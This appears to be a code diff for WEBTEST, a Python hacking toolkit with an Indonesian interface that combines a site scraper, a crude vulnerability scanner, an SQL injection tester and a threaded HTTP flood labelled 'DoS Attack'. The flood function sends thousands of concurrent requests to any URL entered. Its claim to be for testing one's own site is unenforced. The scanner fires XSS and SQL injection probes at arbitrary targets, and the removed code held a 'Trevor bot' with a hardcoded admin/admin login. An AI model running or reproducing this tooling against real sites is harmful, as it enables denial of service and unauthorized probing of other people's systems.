+                        'type': 'SQL Injection',
+                        'severity': 'High',
+                        'description': f'Potential SQL Injection vulnerability detected: {error}'
+                    })
+                    break
+        except:
+            pass
+        
+        # Test for XSS (basic test)
+        try:
+            test_url = urljoin(url, "?q=<script>alert('XSS')</script>")
+            response = self.session.get(test_url, timeout=5)
+            
+            if "<script>alert('XSS')</script>" in response.text:
+                scan_results['security_issues'].append("Potential XSS vulnerability")
+                scan_results['vulnerabilities'].append({
+                    'type': 'Cross-Site Scripting (XSS)',
+                    'severity': 'High',
+                    'description': 'Potential XSS vulnerability detected'
+                })
+        except:
+            pass
+        
+        # Calculate security score
+        max_score = 100
+        deductions = 0
+        
+        for vuln in scan_results['vulnerabilities']:
+            if vuln['severity'] == 'High':
+                deductions += 15
+            elif vuln['severity'] == 'Medium':
+                deductions += 8
+            elif vuln['severity'] == 'Low':
+                deductions += 3
+        
+        scan_results['security_score'] = max(0, max_score - deductions)
+        
+        # Generate recommendations
+        if scan_results['security_score'] < 70:
+            scan_results['recommendations'].append("Implement all missing security headers")
+            scan_results['recommendations'].append("Regularly update server software and frameworks")
+            scan_results['recommendations'].append("Perform regular security audits")
+        
+        if any(v['type'] == 'Exposed Path' for v in scan_results['vulnerabilities']):
+            scan_results['recommendations'].append("Restrict access to sensitive files and directories")
+            scan_results['recommendations'].append("Implement proper access controls")
+        
+        if any(v['type'] == 'SQL Injection' for v in scan_results['vulnerabilities']):
+            scan_results['recommendations'].append("Use parameterized queries or prepared statements")
+            scan_results['recommendations'].append("Implement input validation and sanitization")
+        
+        if any(v['type'] == 'Cross-Site Scripting (XSS)' for v in scan_results['vulnerabilities']):
+            scan_results['recommendations'].append("Implement Content Security Policy (CSP)")
+            scan_results['recommendations'].append("Sanitize user input and encode output")
+        
+        if info['is_secure'] and scan_results['ssl_info']:
+            if scan_results['ssl_info']['connection']['protocol'] in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
+                scan_results['recommendations'].append("Upgrade to TLS 1.2 or higher")
+            
+            if scan_results['ssl_info']['connection']['bits'] < 128:
+                scan_results['recommendations'].append("Use stronger cipher suites")
+        
+        return scan_results
+    
+    def display_scan_results(self, scan_results):
+        """Display the scan results in a formatted way"""
+        if not scan_results:
+            self.typewriter_effect("❌ No scan results to display")
+            return
+        
+        self.typewriter_effect("\n🔍 WEBSITE SECURITY SCAN RESULTS:")
+        self.typewriter_effect("══════════════════════════════════════════════")
+        
+        # Basic Info
+        self.typewriter_effect(f"\n🌐 Target: {scan_results['url']}")
+        self.typewriter_effect(f"🖥️ Domain: {scan_results['domain']}")
+        self.typewriter_effect(f"📡 IP Address: {scan_results['ip_address']}")
+        
+        # Security Score
+        score = scan_results['security_score']
+        if score >= 90:
+            score_color = C['G']
+            score_text = "Excellent"
+        elif score >= 70:
+            score_color = C['Y']
+            score_text = "Good"
+        elif score >= 50:
+            score_color = C['Y']
+            score_text = "Fair"
+        else:
+            score_color = C['R']
+            score_text = "Poor"
+            
+        self.typewriter_effect(f"\n🛡️ Security Score: {score_color}{score}/100 ({score_text}){C['RESET']}")
+        
+        # SSL/TLS Info
+        if scan_results['ssl_info']:
+            self.typewriter_effect("\n🔒 SSL/TLS Information:")
+            ssl_info = scan_results['ssl_info']
+            
+            # Certificate info
+            cert = ssl_info['certificate']
+            self.typewriter_effect(f"   Certificate Subject: {cert['subject'].get('commonName', 'N/A')}")
+            self.typewriter_effect(f"   Certificate Issuer: {cert['issuer'].get('commonName', 'N/A')}")
+            self.typewriter_effect(f"   Certificate Valid Until: {cert['not_after']}")
+            
+            # Connection info
+            conn = ssl_info['connection']
+            self.typewriter_effect(f"   Protocol: {conn['protocol']}")
+            self.typewriter_effect(f"   Cipher: {conn['cipher']} ({conn['bits']} bits)")
+        
+        # Vulnerabilities
+        if scan_results['vulnerabilities']:
+            self.typewriter_effect(f"\n{C['R']}🚨 Vulnerabilities Found:{C['RESET']}")
+            for vuln in scan_results['vulnerabilities']:
+                if vuln['severity'] == 'High':
+                    severity_color = C['R']
+                elif vuln['severity'] == 'Medium':
+                    severity_color = C['Y']
+                else:
+                    severity_color = C['W']
+                    
+                self.typewriter_effect(f"   {severity_color}[{vuln['severity']}] {vuln['type']}{C['RESET']}")
+                self.typewriter_effect(f"      {vuln['description']}")
+        else:
+            self.typewriter_effect(f"\n{C['G']}✅ No vulnerabilities detected{C['RESET']}")
+        
+        # Security Issues
+        if scan_results['security_issues']:
+            self.typewriter_effect(f"\n{C['Y']}⚠️ Security Issues:{C['RESET']}")
+            for issue in scan_results['security_issues']:
+                self.typewriter_effect(f"   • {issue}")
+        
+        # Exposed Files and Directories
+        if scan_results['exposed_files']:
+            self.typewriter_effect(f"\n{C['R']}📁 Exposed Files:{C['RESET']}")
+            for file in scan_results['exposed_files']:
+                self.typewriter_effect(f"   • {file}")
+        
+        if scan_results['directory_listing']:
+            self.typewriter_effect(f"\n{C['R']}📂 Directory Listing Enabled:{C['RESET']}")
+            for dir in scan_results['directory_listing']:
+                self.typewriter_effect(f"   • {dir}")
+        
+        # Recommendations
+        if scan_results['recommendations']:
+            self.typewriter_effect(f"\n{C['B']}💡 Recommendations:{C['RESET']}")
+            for rec in scan_results['recommendations']:
+                self.typewriter_effect(f"   • {rec}")
+        
+        self.typewriter_effect("\n✅ Website security scan complete")
+
+# ====== DoS Attack ======
+def dos_attack():
+    type_print(f"{C['R']}{EMO['dos']} Customizable DoS Attack (for testing your own website){C['RESET']}")
+    target_url = input_colored(f"{EMO['dos']} Masukkan URL target (http/https):")
+    
+    if not re.match(r"^https?://", target_url):
+        type_print(f"{C['R']}{EMO['warn']} URL harus diawali http/https{C['RESET']}")
+        return
+    
+    # Input validation
+    while True:
+        try:
+            requests_count = input_colored("Jumlah requests (Default 1000 Max 10000):").strip()
+            if not requests_count:
+                requests_count = 1000
+            else:
+                requests_count = int(requests_count)
+                if requests_count > 10000:
+                    type_print(f"{C['Y']}{EMO['warn']} Maksimum 10000, menggunakan 10000{C['RESET']}")
+                    requests_count = 10000
+            break
+        except ValueError:
+            type_print(f"{C['R']}❌ Masukkan angka yang valid{C['RESET']}")
+    
+    while True:
+        try:
+            thread_count = input_colored("Jumlah threads (Default 10 Max 100):").strip()
+            if not thread_count:
+                thread_count = 10
+            else:
+                thread_count = int(thread_count)
+                if thread_count > 100:
+                    type_print(f"{C['Y']}{EMO['warn']} Maksimum 100, menggunakan 100{C['RESET']}")
+                    thread_count = 100
+            break
+        except ValueError:
+            type_print(f"{C['R']}❌ Masukkan angka yang valid{C['RESET']}")
+    
+    while True:
+        try:
+            delay = input_colored("Delay antar requests dalam detik (Default 0.1):").strip()
+            if not delay:
+                delay = 0.1
+            else:
+                delay = float(delay)
+            break
+        except ValueError:
+            type_print(f"{C['R']}❌ Masukkan angka yang valid{C['RESET']}")
+    
+    # Confirmation
+    type_print(f"\n{C['BOLD']}{EMO['dos']} Konfigurasi Attack:{C['RESET']}")
+    type_print(f"   Target: {target_url}")
+    type_print(f"   Total Requests: {requests_count}")
+    type_print(f"   Threads: {thread_count}")
+    type_print(f"   Delay: {delay} detik")
+    
+    confirm = input_colored("\nYakin ingin meluncurkan attack? (yes/no):").lower()
+    if confirm != 'yes':
+        type_print(f"{C['Y']}{EMO['warn']} Attack dibatalkan{C['RESET']}")
+        return
+    
+    # Attack statistics
+    successful_requests = 0
+    failed_requests = 0
+    start_time = time.time()
+    DOS_STOP_EVENT.clear()
+    
+    # Worker function
+    def attack_worker(url, req_count, delay_time):
+        nonlocal successful_requests, failed_requests
+        thread_session = requests.Session()
+        thread_session.headers.update({"User-Agent": UA})
+        for _ in range(req_count):
+            if DOS_STOP_EVENT.is_set():
+                break
+            try:
+                response = thread_session.get(url, timeout=5)
+                if response.status_code == 200:
+                    successful_requests += 1
+                else:
+                    failed_requests += 1
+            except:
+                failed_requests += 1
+            time.sleep(delay_time)
+    
+    # Calculate requests per thread
+    requests_per_thread = requests_count // thread_count
+    remaining_requests = requests_count % thread_count
+    
+    # Start threads
+    type_print(f"\n{C['R']}{EMO['dos']} Meluncurkan DoS attack... Tekan Ctrl+C untuk menghentikan{C['RESET']}")
+    threads = []
+    
+    for i in range(thread_count):
+        # Distribute remaining requests to first few threads
+        req_count = requests_per_thread + (1 if i < remaining_requests else 0)
+        if req_count > 0:
+            t = threading.Thread(target=attack_worker, args=(target_url, req_count, delay))
+            t.daemon = True
+            t.start()
+            threads.append(t)
+    
+    # Progress monitoring
+    try:
+        while any(t.is_alive() for t in threads):
+            elapsed = time.time() - start_time
+            reqs_per_sec = (successful_requests + failed_requests) / elapsed if elapsed > 0 else 0
+            
+            # Bersihkan kode ANSI sebelum mencetak
+            clean_text = clean_ansi(f"\r{C['R']}⚡ Status: {successful_requests + failed_requests}/{requests_count} requests | "
+                           f"Success: {successful_requests}✅| "
+                           f"Failed: {failed_requests} | "
+                           f"Rate: {reqs_per_sec:.1f} reqs/sec{C['RESET']}")
+            sys.stdout.write(clean_text)
+            sys.stdout.flush()
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        DOS_STOP_EVENT.set()
+        type_print(f"\n{C['Y']}{EMO['warn']} Attack dihentikan oleh pengguna{C['RESET']}")
+    
+    # Final statistics
+    elapsed = time.time() - start_time
+    reqs_per_sec = (successful_requests + failed_requests) / elapsed if elapsed > 0 else 0
+    
+    type_print(f"\n\n{C['BOLD']}{EMO['dos']} Hasil Attack:{C['RESET']}")
+    type_print(f"   Total Requests: {successful_requests + failed_requests}")
+    type_print(f"   Successful: {successful_requests}")
+    type_print(f"   Failed: {failed_requests}")
+    type_print(f"   Duration: {elapsed:.2f} detik")
+    type_print(f"   Request Rate: {reqs_per_sec:.1f} requests/detik")
+    
+    # Tampilkan IP publik setelah attack
+    ip = get_public_ip()
+    type_print(f"{C['BOLD']}{EMO['net']} IP Publik kamu: {C['Y']}{ip}{C['RESET']}")
+
+def scrape_flow():
+    url = input_colored(f"{EMO['net']} Masukkan URL target (https://...):")
+    if not re.match(r"^https?://", url):
+        type_print(f"{C['R']}{EMO['warn']} URL harus diawali http/https{C['RESET']}")
+        return
+    
+    outdir = choose_dir_for(url)
+    ensure_dir(outdir)
+    ensure_dir(os.path.join(outdir, "assets", "css"))
+    ensure_dir(os.path.join(outdir, "assets", "js"))
+    ensure_dir(os.path.join(outdir, "assets", "img"))
+    ensure_dir(os.path.join(outdir, "assets", "icons"))
+    
+    type_print(f"{C['C']}{EMO['search']} Mengambil HTML...{C['RESET']}", 0.005)
+    STOP_EVENT.clear()
+    t = threading.Thread(target=spinner, args=("Fetching",), daemon=True)
+    t.start()
+    try:
+        html = fetch_html(url)
+    except Exception as e:
+        STOP_EVENT.set()
+        t.join()
+        type_print(f"{C['R']}Gagal mengambil halaman: {e}{C['RESET']}")
+        return
+    STOP_EVENT.set()
+    t.join()
+    type_print(f"{C['G']}{EMO['ok']} HTML didapat ({len(html):,} chars){C['RESET']}")
+    write_text(os.path.join(outdir, "index.html"), html)
+    type_print(f"{EMO['disk']} Disimpan: {C['Y']}{outdir}/index.html{C['RESET']}")
+    
+    assets = extract_assets(url, html)
+    
+    # Simpan meta ke file
+    write_text(os.path.join(outdir, "meta.json"), json.dumps(assets["meta"], indent=2, ensure_ascii=False))
+    
+    while True:
+        print(f"""
+{C['BOLD']}{EMO['gear']} Menu Scraping — {C['Y']}WEBTEST{C['RESET']}
+{C['GR']}Folder: {outdir}{C['RESET']}
+  1) {EMO['down']} Download HTML
+  2) {EMO['down']} Download CSS ({len(assets['css'])})
+  3) {EMO['down']} Download JS ({len(assets['js'])})
+  4) {EMO['down']} Download Assets (img/icons) ({len(assets['img']) + len(assets['icons'])})
+  5) {EMO['down']} Download Meta Tags (jika ada)
+  6) {EMO['down']} Download Full (HTML+CSS+JS+Assets+Meta)
+  ketik 'exit' untuk keluar menu ini
+""")
+        choice = input_colored("Pilih opsi:")
+        if choice.lower() == "exit":
+            type_print(f"{C['M']}{EMO['exit']} Keluar dari menu scraping{C['RESET']}")
+            break
+        if choice == "1":
+            # sudah tersimpan sebagai index.html
+            type_print(f"{C['G']}{EMO['ok']} HTML sudah disimpan sebagai index.html{C['RESET']}")
+        elif choice == "2":
+            total = len(assets["css"])
+            if not total:
+                type_print(f"{C['Y']}{EMO['info']} Tidak ada CSS terdeteksi.{C['RESET']}")
+                continue
+            type_print(f"{EMO['down']} Download CSS ({total})...")
+            for url_css in assets["css"]:
+                name = sanitize_folder(os.path.basename(urlparse(url_css).path) or "style.css")
+                dest = os.path.join(outdir, "assets", "css", name)
+                ok, er = download_file(url_css, dest)
+                msg = f"{C['G']}OK{C['RESET']}" if ok else f"{C['R']}FAIL: {er}{C['RESET']}"
+                print(f"  - {name}: {msg}")
+        elif choice == "3":
+            total = len(assets["js"])
+            if not total:
+                type_print(f"{C['Y']}{EMO['info']} Tidak ada JS terdeteksi.{C['RESET']}")
+                continue
+            type_print(f"{EMO['down']} Download JS ({total})...")
+            for url_js in assets["js"]:
+                name = sanitize_folder(os.path.basename(urlparse(url_js).path) or "script.js")
+                dest = os.path.join(outdir, "assets", "js", name)
+                ok, er = download_file(url_js, dest)
+                msg = f"{C['G']}OK{C['RESET']}" if ok else f"{C['R']}FAIL: {er}{C['RESET']}"
+                print(f"  - {name}: {msg}")
+        elif choice == "4":
+            imgs = list(assets["img"])
+            icons = list(assets["icons"])
+            total = len(imgs) + len(icons)
+            if not total:
+                type_print(f"{C['Y']}{EMO['info']} Tidak ada assets (img/icons).{C['RESET']}")
+                continue
+            type_print(f"{EMO['down']} Download Assets ({total})...")
+            for u in imgs:
+                name = sanitize_folder(os.path.basename(urlparse(u).path) or f"img_{random.randint(1000,9999)}")
+                dest = os.path.join(outdir, "assets", "img", name)
+                ok, er = download_file(u, dest)
+                msg = f"{C['G']}OK{C['RESET']}" if ok else f"{C['R']}FAIL: {er}{C['RESET']}"
+                print(f"  - {name}: {msg}")
+            for u in icons:
+                name = sanitize_folder(os.path.basename(urlparse(u).path) or f"icon_{random.randint(1000,9999)}")
+                dest = os.path.join(outdir, "assets", "icons", name)
+                ok, er = download_file(u, dest)
+                msg = f"{C['G']}OK{C['RESET']}" if ok else f"{C['R']}FAIL: {er}{C['RESET']}"
+                print(f"  - {name}: {msg}")
+        elif choice == "5":
+            meta_file = os.path.join(outdir, "meta.json")
+            if os.path.exists(meta_file) and os.path.getsize(meta_file) > 2:
+                type_print(f"{C['G']}{EMO['ok']} Meta tags disimpan: {meta_file}{C['RESET']}")
+            else:
+                type_print(f"{C['Y']}{EMO['info']} Tidak ada meta tags signifikan.{C['RESET']}")
+        elif choice == "6":
+            # Full: pastikan semuanya diunduh
+            type_print(f"{EMO['down']} Download Full dimulai...")
+            # CSS
+            for url_css in assets["css"]:
+                name = sanitize_folder(os.path.basename(urlparse(url_css).path) or "style.css")
+                dest = os.path.join(outdir, "assets", "css", name)
+                download_file(url_css, dest)
+            # JS
+            for url_js in assets["js"]:
+                name = sanitize_folder(os.path.basename(urlparse(url_js).path) or "script.js")
+                dest = os.path.join(outdir, "assets", "js", name)
+                download_file(url_js, dest)
+            # IMG & ICONS
+            for u in list(assets["img"]) + list(assets["icons"]):
+                name = sanitize_folder(os.path.basename(urlparse(u).path) or f"res_{random.randint(1000,9999)}")
+                sub = "icons" if u in assets["icons"] else "img"
+                dest = os.path.join(outdir, "assets", sub, name)
+                download_file(u, dest)
+            # META sudah disimpan
+            type_print(f"{C['G']}{EMO['ok']} Full download selesai. Cek folder: {outdir}{C['RESET']}")
+        else:
+            type_print(f"{C['R']}Pilihan tidak valid.{C['RESET']}")
+    
+    # tampilkan IP publik setelah keluar menu scraping
+    ip = get_public_ip()
+    type_print(f"{C['BOLD']}{EMO['net']} IP Publik kamu: {C['Y']}{ip}{C['RESET']}")
+
+def scan_flow():
+    scanner = WebsiteScanner()
+    url = input_colored(f"{EMO['scan']} Masukkan URL target (https://...):")
+    if not re.match(r"^https?://", url):
+        type_print(f"{C['R']}{EMO['warn']} URL harus diawali http/https{C['RESET']}")
+        return
+    
+    # Get basic website info
+    info = scanner.get_web_info(url)
+    if info:
+        scanner.display_web_info(info)
+    
+    # Perform security scan
+    scan_results = scanner.scan_website(url)
+    if scan_results:
+        scanner.display_scan_results(scan_results)
+    
+    # Tampilkan IP publik setelah scan
+    ip = get_public_ip()
+    type_print(f"{C['BOLD']}{EMO['net']} IP Publik kamu: {C['Y']}{ip}{C['RESET']}")
+
+def sql_injection_flow():
+    scanner = WebsiteScanner()
+    url = input_colored(f"{EMO['shield']} Masukkan URL target untuk SQL Injection Test (https://...):")
+    if not re.match(r"^https?://", url):
+        type_print(f"{C['R']}{EMO['warn']} URL harus diawali http/https{C['RESET']}")
+        return
+    
+    # Reset vulnerabilities list
+    scanner.vulnerabilities = []
+    
+    # Perform SQL injection test
+    scanner.sql_injection_test(url)
+    
+    # Display results
+    if scanner.vulnerabilities:
+        type_print(f"\n{C['R']}🚨 SQL Injection Vulnerabilities Found:{C['RESET']}")
+        for vuln in scanner.vulnerabilities:
+            if vuln['severity'] == 'Critical':
+                severity_color = C['R']
+            elif vuln['severity'] == 'High':
+                severity_color = C['R']
+            elif vuln['severity'] == 'Medium':
+                severity_color = C['Y']
+            else:
+                severity_color = C['W']
+                
+            type_print(f"   {severity_color}[{vuln['severity']}] {vuln['type']}{C['RESET']}")
+            type_print(f"      {vuln['description']}")
+            
+            if 'parameter' in vuln:
+                type_print(f"      Parameter: {vuln['parameter']}")
+            
+            if 'payload' in vuln:
+                type_print(f"      Payload: {vuln['payload']}")
+            
+            if 'database' in vuln:
+                type_print(f"      Database: {vuln['database']}")
+            
+            if 'table' in vuln:
+                type_print(f"      Table: {vuln['table']}")
+            
+            if 'data' in vuln:
+                type_print(f"      Data: {vuln['data']}")
+    else:
+        type_print(f"\n{C['G']}✅ No SQL Injection vulnerabilities detected{C['RESET']}")
+    
+    # Tampilkan IP publik setelah test
+    ip = get_public_ip()
+    type_print(f"{C['BOLD']}{EMO['net']} IP Publik kamu: {C['Y']}{ip}{C['RESET']}")
+
+def main():
+    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
+    while True:
+        banner()
+        type_print(f"{C['W']}{EMO['rocket']} Selamat datang di {C['BOLD']}WEBTEST{C['RESET']}{C['W']} — pilih menu:{C['RESET']}", 0.003)
+        print(f"""
+{C['BOLD']}Menu Utama:{C['RESET']}
+  1) {EMO['spider']} Scraping Website
+  2) {EMO['scan']} Website Security Scanner
+  3) {EMO['dos']} DoS Attack (for testing)
+  4) {EMO['shield']} SQL Injection Test
+  5) {EMO['exit']} Keluar
+""")
+        choice = input_colored("Pilihan kamu:")
+        if choice == "1":
+            scrape_flow()
+            input(f"\n{C['GR']}Tekan Enter untuk kembali ke menu utama...{C['RESET']}")
+        elif choice == "2":
+            scan_flow()
+            input(f"\n{C['GR']}Tekan Enter untuk kembali ke menu utama...{C['RESET']}")
+        elif choice == "3":
+            dos_attack()
+            input(f"\n{C['GR']}Tekan Enter untuk kembali ke menu utama...{C['RESET']}")
+        elif choice == "4":
+            sql_injection_flow()
+            input(f"\n{C['GR']}Tekan Enter untuk kembali ke menu utama...{C['RESET']}")
+        elif choice == "5":
+            type_print(f"{C['M']}{EMO['exit']} Bye!{C['RESET']}")
+            break
+        else:
+            type_print(f"{C['R']}Pilihan tidak valid.{C['RESET']}")
+            time.sleep(1.2)
 
 if __name__ == "__main__":
-    required_packages = ['requests', 'beautifulsoup4', 'flask', 'pyopenssl',
-                         'cryptography', 'dnspython', 'python-nmap', 'scapy']
-    
-    print("🔧 Checking dependencies...")
-    for package in required_packages:
-        try:
-            __import__(package.replace('-', '_'))
-        except ImportError:
-            print(f"Installing {package}...")
-            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-    
-    print("\nTREVOR BOT LOGIN 2.6🚀\n")
-    username = input("[*] 👤 Username: ")
-    password = input("[*] 🔑 Password: ")
-
-    if username.strip().lower() == "admin" and password.strip().lower() == "admin":
-        print("\n[*] Login successful!✅")
-        time.sleep(2)
-        print("[*] Unlocking payload database...🔓")
-        time.sleep(2)
-        
-        # Create bot instance first to access the method
-        bot = Trevor()
-        
-        # Get and display public IP
-        public_ip = bot.get_public_ip()
-        print(f"[*] Your Public IP: {public_ip} 🌐")
-        
-        print("[*] Activate Trevor bot 2.6 edition dos attack and scraper bug fixed🔥🚀\n")
-        time.sleep(4)
-        
-        # jalankan bot
-        bot.run()
-    else:
-        time.sleep(2)
-        print("❌ Incorrect username or password!")
-        sys.exit()
+    main()
